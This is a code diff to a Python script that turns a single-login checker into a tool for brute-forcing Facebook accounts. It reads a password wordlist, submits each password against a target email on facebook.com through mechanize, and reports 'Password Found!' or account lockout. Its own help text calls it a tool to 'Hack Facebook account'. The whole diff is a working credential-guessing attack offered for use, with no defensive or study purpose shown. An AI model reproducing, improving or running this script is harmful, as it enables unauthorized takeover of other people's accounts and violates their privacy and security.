@@ -1,11 +1,11 @@
+import time 
 import argparse
 import mechanize
-from bs4 import BeautifulSoup
 
 class Hack():
-    def __init__(self, username, password, url):
-        self.__username = username
-        self.__password = password
+    def __init__(self, email, wordlist, url):
+        self.__email = email
+        self.__wordlist = wordlist
         self.__url = url
 
 
@@ -13,46 +13,62 @@ class Hack():
         br = mechanize.Browser()
 
         br.set_handle_robots(False)
-        br.set_handle_refresh(False)
         
-        br.addheaders = [("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")]
+        br.addheaders = [("User-agent","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13")]
 
         response = br.open(self.__url)
 
-        self.__start_hacking(br, response)
-    
+        time.sleep(3)
 
-    def __start_hacking(self, br, response):
-        br.form = list(br.forms())[0]
-
-        email_control = br.form.find_control("email")
-        password_control = br.form.find_control("pass")
-
-        email_control.value = self.__username
-        password_control.value = self.__password
-
-        response = br.submit()
-
-        soup = BeautifulSoup(response,'html.parser')
-
-        element = soup.find("h2", string="Your Request Couldn't be Processed")
-
-        if element:
-            print("[-] " + element.text)
+        if response.code == 200:
+            print("[+] Connected to Facebook")
+            self.__start_hacking(br)
         else:
-            print("OK")
+            print("[-] Unable to connect to the Facebook!")
+            exit(0)
 
-        
+
+    def __start_hacking(self, br):
+        with open(self.__wordlist, "r") as password_list:
+            passwords = password_list.readlines()
+
+        for password in passwords:
+            password = password.strip()
+
+            br.select_form(nr = 0)
+
+            print("Trying Password: " + str(password) + "\n" + "-----------------")
+
+            br["email"] = self.__email
+            br["pass"] = password
+
+            logged_in = br.submit()
+
+            time.sleep(5)
+
+            if logged_in.get_data().__contains__(b'just tap your account instead of typing a password.'):
+                print("Password Found!")
+                exit(0)
+            elif logged_in.get_data().__contains__(b"To help keep your account safe, we temporarily locked it"):
+                print("Account Locked Temporarily!")
+                exit(0)
+            elif logged_in.get_data().__contains__(b"We limit how often you can post, comment or do other things in a given amount of time in order to help protect the community from spam. You can try again later"):
+                print("Feature not available right now!")
+                exit(0)
+            else:
+                time.sleep(5)
+                pass
+
 
 def start():
     parser = argparse.ArgumentParser(description="Hack Facebook account")
 
-    parser.add_argument("-username", type=str, help="Username of the target")
-    parser.add_argument("-password", type=str, help="Password of the target")
+    parser.add_argument("-e", dest = "email_address", type=str, help="Email of the target")
+    parser.add_argument("-w", dest = "wordlist", type=str, help="Password Wordlist in txt format")
 
     args = parser.parse_args()
 
-    hack = Hack(username=args.username, password=args.password, url="https://www.facebook.com")
+    hack = Hack(email=args.email_address, wordlist=args.wordlist, url="https://www.facebook.com")
     hack._get_website()
 
 
